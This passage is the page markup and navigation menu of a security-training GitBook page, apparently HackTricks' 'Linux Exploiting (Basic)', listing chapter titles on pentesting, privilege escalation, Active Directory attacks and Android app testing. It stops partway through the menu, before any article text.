
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>Linux Exploiting (Basic) (SPA) Â· GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="rop-syscall-execv.html" />
    
    
    <link rel="prev" href="../../physical-attacks/escaping-from-gui-applications/show-file-extensions.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../../">
            
                <a href="../../">
            
                    
                    HackTricks
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../../general/pentesting-methodology.html">
            
                <a href="../../general/pentesting-methodology.html">
            
                    
                    Pentesting Methodology
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="../../general/external-recon-methodology.html">
            
                <a href="../../general/external-recon-methodology.html">
            
                    
                    External Recon Methodology
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="../../general/about-the-author.html">
            
                <a href="../../general/about-the-author.html">
            
                    
                    About the author
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="../../general/exfiltration.html">
            
                <a href="../../general/exfiltration.html">
            
                    
                    Exfiltration
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="../../general/tunneling-and-port-forwarding.html">
            
                <a href="../../general/tunneling-and-port-forwarding.html">
            
                    
                    Tunneling and Port Forwarding
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7" data-path="../../general/brute-force.html">
            
                <a href="../../general/brute-force.html">
            
                    
                    Brute Force - CheatSheet
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8" data-path="../../general/search-exploits.html">
            
                <a href="../../general/search-exploits.html">
            
                    
                    Search Exploits
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Shells</li>
        
        
    
        <li class="chapter " data-level="2.1" data-path="../../shells/shells/">
            
                <a href="../../shells/shells/">
            
                    
                    Shells (Linux, Windows, MSFVenom)
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1" data-path="../../shells/shells/untitled.html">
            
                <a href="../../shells/shells/untitled.html">
            
                    
                    MSFVenom - CheatSheet
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.2" data-path="../../shells/shells/windows.html">
            
                <a href="../../shells/shells/windows.html">
            
                    
                    Shells - Windows
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3" data-path="../../shells/shells/linux.html">
            
                <a href="../../shells/shells/linux.html">
            
                    
                    Shells - Linux
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.4" data-path="../../shells/shells/full-ttys.html">
            
                <a href="../../shells/shells/full-ttys.html">
            
                    
                    Full TTYs
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">Linux/Unix</li>
        
        
    
        <li class="chapter " data-level="3.1" data-path="../../linux-unix/linux-privilege-escalation-checklist.html">
            
                <a href="../../linux-unix/linux-privilege-escalation-checklist.html">
            
                    
                    Checklist - Linux Privilege Escalation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2" data-path="../../linux-unix/privilege-escalation/">
            
                <a href="../../linux-unix/privilege-escalation/">
            
                    
                    Linux Privilege Escalation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.2.1" data-path="../../linux-unix/privilege-escalation/electron-cef-chromium-debugger-abuse.html">
            
                <a href="../../linux-unix/privilege-escalation/electron-cef-chromium-debugger-abuse.html">
            
                    
                    electron/CEF/chromium debugger abuse
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.2" data-path="../../linux-unix/privilege-escalation/escaping-from-a-docker-container.html">
            
                <a href="../../linux-unix/privilege-escalation/escaping-from-a-docker-container.html">
            
                    
                    Escaping from a Docker container
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.3" data-path="../../linux-unix/privilege-escalation/escaping-from-limited-bash.html">
            
                <a href="../../linux-unix/privilege-escalation/escaping-from-limited-bash.html">
            
                    
                    Escaping from restricted shells - Jails
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.4" data-path="../../linux-unix/privilege-escalation/cisco-vmanage.html">
            
                <a href="../../linux-unix/privilege-escalation/cisco-vmanage.html">
            
                    
                    Cisco - vmanage
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.5" data-path="../../linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation.html">
            
                <a href="../../linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation.html">
            
                    
                    D-Bus Enumeration & Command Injection Privilege Escalation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.6" data-path="../../linux-unix/privilege-escalation/interesting-groups-linux-pe/">
            
                <a href="../../linux-unix/privilege-escalation/interesting-groups-linux-pe/">
            
                    
                    Interesting Groups - Linux PE
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.2.6.1" data-path="../../linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html">
            
                <a href="../../linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html">
            
                    
                    lxd/lxc Group - Privilege escalation
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.2.7" data-path="../../linux-unix/privilege-escalation/ld.so.conf-example.html">
            
                <a href="../../linux-unix/privilege-escalation/ld.so.conf-example.html">
            
                    
                    ld.so exploit example
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.8" data-path="../../linux-unix/privilege-escalation/linux-capabilities.html">
            
                <a href="../../linux-unix/privilege-escalation/linux-capabilities.html">
            
                    
                    Linux Capabilities
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.9" data-path="../../linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.html">
            
                <a href="../../linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.html">
            
                    
                    NFS no_root_squash/no_all_squash misconfiguration PE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.10" data-path="../../linux-unix/privilege-escalation/ssh-forward-agent-exploitation.html">
            
                <a href="../../linux-unix/privilege-escalation/ssh-forward-agent-exploitation.html">
            
                    
                    SSH Forward Agent exploitation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.11" data-path="../../linux-unix/privilege-escalation/socket-command-injection.html">
            
                <a href="../../linux-unix/privilege-escalation/socket-command-injection.html">
            
                    
                    Socket Command Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.12" data-path="../../linux-unix/privilege-escalation/payloads-to-execute.html">
            
                <a href="../../linux-unix/privilege-escalation/payloads-to-execute.html">
            
                    
                    Payloads to execute
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2.13" data-path="../../linux-unix/privilege-escalation/wildcards-spare-tricks.html">
            
                <a href="../../linux-unix/privilege-escalation/wildcards-spare-tricks.html">
            
                    
                    Wildcards Spare tricks
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.3" data-path="../../linux-unix/useful-linux-commands/">
            
                <a href="../../linux-unix/useful-linux-commands/">
            
                    
                    Useful Linux Commands
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.3.1" data-path="../../linux-unix/useful-linux-commands/bypass-bash-restrictions.html">
            
                <a href="../../linux-unix/useful-linux-commands/bypass-bash-restrictions.html">
            
                    
                    Bypass Bash Restrictions
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.4" data-path="../../linux-unix/linux-environment-variables.html">
            
                <a href="../../linux-unix/linux-environment-variables.html">
            
                    
                    Linux Environment Variables
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Windows</li>
        
        
    
        <li class="chapter " data-level="4.1" data-path="../../windows/checklist-windows-privilege-escalation.html">
            
                <a href="../../windows/checklist-windows-privilege-escalation.html">
            
                    
                    Checklist - Local Windows Privilege Escalation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2" data-path="../../windows/windows-local-privilege-escalation/">
            
                <a href="../../windows/windows-local-privilege-escalation/">
            
                    
                    Windows Local Privilege Escalation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.2.1" data-path="../../windows/windows-local-privilege-escalation/dpapi-extracting-passwords.html">
            
                <a href="../../windows/windows-local-privilege-escalation/dpapi-extracting-passwords.html">
            
                    
                    DPAPI - Extracting Passwords
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.2" data-path="../../windows/windows-local-privilege-escalation/seimpersonate-from-high-to-system.html">
            
                <a href="../../windows/windows-local-privilege-escalation/seimpersonate-from-high-to-system.html">
            
                    
                    SeImpersonate from High To System
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.3" data-path="../../windows/windows-local-privilege-escalation/access-tokens.html">
            
                <a href="../../windows/windows-local-privilege-escalation/access-tokens.html">
            
                    
                    Access Tokens
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.4" data-path="../../windows/windows-local-privilege-escalation/acls-dacls-sacls-aces.html">
            
                <a href="../../windows/windows-local-privilege-escalation/acls-dacls-sacls-aces.html">
            
                    
                    ACLs - DACLs/SACLs/ACEs
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.5" data-path="../../windows/windows-local-privilege-escalation/dll-hijacking.html">
            
                <a href="../../windows/windows-local-privilege-escalation/dll-hijacking.html">
            
                    
                    Dll Hijacking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.6" data-path="../../windows/windows-local-privilege-escalation/from-high-integrity-to-system-with-name-pipes.html">
            
                <a href="../../windows/windows-local-privilege-escalation/from-high-integrity-to-system-with-name-pipes.html">
            
                    
                    From High Integrity to SYSTEM with Name Pipes
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.7" data-path="../../windows/windows-local-privilege-escalation/integrity-levels.html">
            
                <a href="../../windows/windows-local-privilege-escalation/integrity-levels.html">
            
                    
                    Integrity Levels
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.8" data-path="../../windows/windows-local-privilege-escalation/jaws.html">
            
                <a href="../../windows/windows-local-privilege-escalation/jaws.html">
            
                    
                    JAWS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.9" data-path="../../windows/windows-local-privilege-escalation/juicypotato.html">
            
                <a href="../../windows/windows-local-privilege-escalation/juicypotato.html">
            
                    
                    JuicyPotato
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.10" data-path="../../windows/windows-local-privilege-escalation/leaked-handle-exploitation.html">
            
                <a href="../../windows/windows-local-privilege-escalation/leaked-handle-exploitation.html">
            
                    
                    Leaked Handle Exploitation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.11" data-path="../../windows/windows-local-privilege-escalation/msi-wrapper.html">
            
                <a href="../../windows/windows-local-privilege-escalation/msi-wrapper.html">
            
                    
                    MSI Wrapper
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.12" data-path="../../windows/windows-local-privilege-escalation/named-pipe-client-impersonation.html">
            
                <a href="../../windows/windows-local-privilege-escalation/named-pipe-client-impersonation.html">
            
                    
                    Named Pipe Client Impersonation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.13" data-path="../../windows/windows-local-privilege-escalation/powerup.html">
            
                <a href="../../windows/windows-local-privilege-escalation/powerup.html">
            
                    
                    PowerUp
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.14" data-path="../../windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html">
            
                <a href="../../windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html">
            
                    
                    Privilege Escalation Abusing Tokens
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.15" data-path="../../windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html">
            
                <a href="../../windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html">
            
                    
                    Privilege Escalation with Autoruns
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.16" data-path="../../windows/windows-local-privilege-escalation/rottenpotato.html">
            
                <a href="../../windows/windows-local-privilege-escalation/rottenpotato.html">
            
                    
                    RottenPotato
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.17" data-path="../../windows/windows-local-privilege-escalation/seatbelt.html">
            
                <a href="../../windows/windows-local-privilege-escalation/seatbelt.html">
            
                    
                    Seatbelt
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.18" data-path="../../windows/windows-local-privilege-escalation/sedebug-+-seimpersonate-copy-token.html">
            
                <a href="../../windows/windows-local-privilege-escalation/sedebug-+-seimpersonate-copy-token.html">
            
                    
                    SeDebug + SeImpersonate copy token
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.19" data-path="../../windows/windows-local-privilege-escalation/windows-c-payloads.html">
            
                <a href="../../windows/windows-local-privilege-escalation/windows-c-payloads.html">
            
                    
                    Windows C Payloads
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.3" data-path="../../windows/active-directory-methodology/">
            
                <a href="../../windows/active-directory-methodology/">
            
                    
                    Active Directory Methodology
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.3.1" data-path="../../windows/active-directory-methodology/acl-persistence-abuse.html">
            
                <a href="../../windows/active-directory-methodology/acl-persistence-abuse.html">
            
                    
                    Abusing Active Directory ACLs/ACEs
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.2" data-path="../../windows/active-directory-methodology/ad-information-in-printers.html">
            
                <a href="../../windows/active-directory-methodology/ad-information-in-printers.html">
            
                    
                    AD information in printers
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.3" data-path="../../windows/active-directory-methodology/asreproast.html">
            
                <a href="../../windows/active-directory-methodology/asreproast.html">
            
                    
                    ASREPRoast
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.4" data-path="../../windows/active-directory-methodology/bloodhound.html">
            
                <a href="../../windows/active-directory-methodology/bloodhound.html">
            
                    
                    BloodHound
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.5" data-path="../../windows/active-directory-methodology/constrained-delegation.html">
            
                <a href="../../windows/active-directory-methodology/constrained-delegation.html">
            
                    
                    Constrained Delegation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.6" data-path="../../windows/active-directory-methodology/custom-ssp.html">
            
                <a href="../../windows/active-directory-methodology/custom-ssp.html">
            
                    
                    Custom SSP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.7" data-path="../../windows/active-directory-methodology/dcshadow.html">
            
                <a href="../../windows/active-directory-methodology/dcshadow.html">
            
                    
                    DCShadow
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.8" data-path="../../windows/active-directory-methodology/dcsync.html">
            
                <a href="../../windows/active-directory-methodology/dcsync.html">
            
                    
                    DCSync
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.9" data-path="../../windows/active-directory-methodology/dsrm-credentials.html">
            
                <a href="../../windows/active-directory-methodology/dsrm-credentials.html">
            
                    
                    DSRM Credentials
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.10" data-path="../../windows/active-directory-methodology/golden-ticket.html">
            
                <a href="../../windows/active-directory-methodology/golden-ticket.html">
            
                    
                    Golden Ticket
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.11" data-path="../../windows/active-directory-methodology/kerberos-authentication.html">
            
                <a href="../../windows/active-directory-methodology/kerberos-authentication.html">
            
                    
                    Kerberos Authentication
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.12" data-path="../../windows/active-directory-methodology/kerberoast.html">
            
                <a href="../../windows/active-directory-methodology/kerberoast.html">
            
                    
                    Kerberoast
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.13" data-path="../../windows/active-directory-methodology/mssql-trusted-links.html">
            
                <a href="../../windows/active-directory-methodology/mssql-trusted-links.html">
            
                    
                    MSSQL Trusted Links
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.14" data-path="../../windows/active-directory-methodology/over-pass-the-hash-pass-the-key.html">
            
                <a href="../../windows/active-directory-methodology/over-pass-the-hash-pass-the-key.html">
            
                    
                    Over Pass the Hash/Pass the Key
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.15" data-path="../../windows/active-directory-methodology/pass-the-ticket.html">
            
                <a href="../../windows/active-directory-methodology/pass-the-ticket.html">
            
                    
                    Pass the Ticket
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.16" data-path="../../windows/active-directory-methodology/password-spraying.html">
            
                <a href="../../windows/active-directory-methodology/password-spraying.html">
            
                    
                    Password Spraying
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.17" data-path="../../windows/active-directory-methodology/printers-spooler-service-abuse.html">
            
                <a href="../../windows/active-directory-methodology/printers-spooler-service-abuse.html">
            
                    
                    Printers Spooler Service abuse
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.18" data-path="../../windows/active-directory-methodology/privileged-accounts-and-token-privileges.html">
            
                <a href="../../windows/active-directory-methodology/privileged-accounts-and-token-privileges.html">
            
                    
                    Privileged Accounts and Token Privileges
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.19" data-path="../../windows/active-directory-methodology/resource-based-constrained-delegation.html">
            
                <a href="../../windows/active-directory-methodology/resource-based-constrained-delegation.html">
            
                    
                    Resource-based Constrained Delegation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.20" data-path="../../windows/active-directory-methodology/security-descriptors.html">
            
                <a href="../../windows/active-directory-methodology/security-descriptors.html">
            
                    
                    Security Descriptors
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.21" data-path="../../windows/active-directory-methodology/silver-ticket.html">
            
                <a href="../../windows/active-directory-methodology/silver-ticket.html">
            
                    
                    Silver Ticket
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.22" data-path="../../windows/active-directory-methodology/skeleton-key.html">
            
                <a href="../../windows/active-directory-methodology/skeleton-key.html">
            
                    
                    Skeleton Key
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3.23" data-path="../../windows/active-directory-methodology/unconstrained-delegation.html">
            
                <a href="../../windows/active-directory-methodology/unconstrained-delegation.html">
            
                    
                    Unconstrained Delegation
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.4" data-path="../../windows/ntlm/">
            
                <a href="../../windows/ntlm/">
            
                    
                    NTLM
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.4.1" data-path="../../windows/ntlm/places-to-steal-ntlm-creds.html">
            
                <a href="../../windows/ntlm/places-to-steal-ntlm-creds.html">
            
                    
                    Places to steal NTLM creds
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.4.2" data-path="../../windows/ntlm/psexec-and-winexec.html">
            
                <a href="../../windows/ntlm/psexec-and-winexec.html">
            
                    
                    PsExec/Winexec/ScExec
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.4.3" data-path="../../windows/ntlm/smbexec.html">
            
                <a href="../../windows/ntlm/smbexec.html">
            
                    
                    SmbExec/ScExec
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.4.4" data-path="../../windows/ntlm/wmicexec.html">
            
                <a href="../../windows/ntlm/wmicexec.html">
            
                    
                    WmicExec
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.4.5" data-path="../../windows/ntlm/atexec.html">
            
                <a href="../../windows/ntlm/atexec.html">
            
                    
                    AtExec / SchtasksExec
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.4.6" data-path="../../windows/ntlm/winrm.html">
            
                <a href="../../windows/ntlm/winrm.html">
            
                    
                    WinRM
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.5" data-path="../../windows/stealing-credentials/">
            
                <a href="../../windows/stealing-credentials/">
            
                    
                    Stealing Credentials
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.5.1" data-path="../../windows/stealing-credentials/credentials-protections.html">
            
                <a href="../../windows/stealing-credentials/credentials-protections.html">
            
                    
                    Credentials Protections
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.5.2" data-path="../../windows/stealing-credentials/credentials-mimikatz.html">
            
                <a href="../../windows/stealing-credentials/credentials-mimikatz.html">
            
                    
                    Mimikatz
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.6" data-path="../../windows/authentication-credentials-uac-and-efs.html">
            
                <a href="../../windows/authentication-credentials-uac-and-efs.html">
            
                    
                    Authentication, Credentials, UAC and EFS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.7" data-path="../../windows/basic-cmd-for-pentesters.html">
            
                <a href="../../windows/basic-cmd-for-pentesters.html">
            
                    
                    Basic CMD for Pentesters
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.8" data-path="../../windows/basic-powershell-for-pentesters/">
            
                <a href="../../windows/basic-powershell-for-pentesters/">
            
                    
                    Basic PowerShell for Pentesters
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.8.1" data-path="../../windows/basic-powershell-for-pentesters/powerview.html">
            
                <a href="../../windows/basic-powershell-for-pentesters/powerview.html">
            
                    
                    PowerView
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.9" data-path="../../windows/av-bypass.html">
            
                <a href="../../windows/av-bypass.html">
            
                    
                    AV Bypass
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Mobile Apps Pentesting</li>
        
        
    
        <li class="chapter " data-level="5.1" data-path="../../mobile-apps-pentesting/android-checklist.md">
            
                <span>
            
                    
                    Android APK Checklist
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2" data-path="../../mobile-apps-pentesting/android-app-pentesting/">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/">
            
                    
                    Android Applications Pentesting
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="5.2.1" data-path="../../mobile-apps-pentesting/android-app-pentesting/adb-commands.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/adb-commands.html">
            
                    
                    ADB Commands
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.2" data-path="../../mobile-apps-pentesting/android-app-pentesting/apk-decompilers.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/apk-decompilers.html">
            
                    
                    APK decompilers
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.3" data-path="../../mobile-apps-pentesting/android-app-pentesting/avd-android-virtual-device.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/avd-android-virtual-device.html">
            
                    
                    AVD - Android Virtual Device
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.4" data-path="../../mobile-apps-pentesting/android-app-pentesting/android-burp-suite-settings.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/android-burp-suite-settings.html">
            
                    
                    Burp Suite Configuration for Android
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.5" data-path="../../mobile-apps-pentesting/android-app-pentesting/drozer-tutorial/">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/drozer-tutorial/">
            
                    
                    Drozer Tutorial
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="5.2.5.1" data-path="../../mobile-apps-pentesting/android-app-pentesting/drozer-tutorial/exploiting-content-providers.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/drozer-tutorial/exploiting-content-providers.html">
            
                    
                    Exploiting Content Providers
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="5.2.6" data-path="../../mobile-apps-pentesting/android-app-pentesting/exploiting-a-debuggeable-applciation.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/exploiting-a-debuggeable-applciation.html">
            
                    
                    Exploiting a debuggeable applciation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.7" data-path="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/">
            
                    
                    Frida Tutorial
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="5.2.7.1" data-path="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/frida-tutorial-1.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/frida-tutorial-1.html">
            
                    
                    Frida Tutorial 1
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.7.2" data-path="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/frida-tutorial-2.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/frida-tutorial-2.html">
            
                    
                    Frida Tutorial 2
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.7.3" data-path="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/owaspuncrackable-1.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/owaspuncrackable-1.html">
            
                    
                    Frida Tutorial 3
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.7.4" data-path="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/objection-tutorial.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/frida-tutorial/objection-tutorial.html">
            
                    
                    Objection Tutorial
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="5.2.8" data-path="../../mobile-apps-pentesting/android-app-pentesting/google-ctf-2018-shall-we-play-a-game.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/google-ctf-2018-shall-we-play-a-game.html">
            
                    
                    Google CTF 2018 - Shall We Play a Game?
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.9" data-path="../../mobile-apps-pentesting/android-app-pentesting/make-apk-accept-ca-certificate.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/make-apk-accept-ca-certificate.html">
            
                    
                    Make APK Accept CA Certificate
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.10" data-path="../../mobile-apps-pentesting/android-app-pentesting/manual-deobfuscation.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/manual-deobfuscation.html">
            
                    
                    Manual DeObfuscation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.11" data-path="../../mobile-apps-pentesting/android-app-pentesting/reversing-native-libraries.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/reversing-native-libraries.html">
            
                    
                    Reversing Native Libraries
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.12" data-path="../../mobile-apps-pentesting/android-app-pentesting/smali-changes.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/smali-changes.html">
            
                    
                    Smali - Decompiling/[Modifying]/Compiling
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.13" data-path="../../mobile-apps-pentesting/android-app-pentesting/spoofing-your-location-in-play-store.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/spoofing-your-location-in-play-store.html">
            
                    
                    Spoofing your location in Play Store
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.14" data-path="../../mobile-apps-pentesting/android-app-pentesting/webview-attacks.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/webview-attacks.html">
            
                    
                    Webview Attacks
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.15" data-path="../../mobile-apps-pentesting/android-app-pentesting/what-are-intents.html">
            
                <a href="../../mobile-apps-pentesting/android-app-pentesting/what-are-intents.html">
            
                    
                    What are Intents
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">Pentesting</li>
        
        
    
        <li class="chapter " data-level="6.1" data-path="../../pentesting/pentesting-network/">
            
                <a href="../../pentesting/pentesting-network/">
            
                    
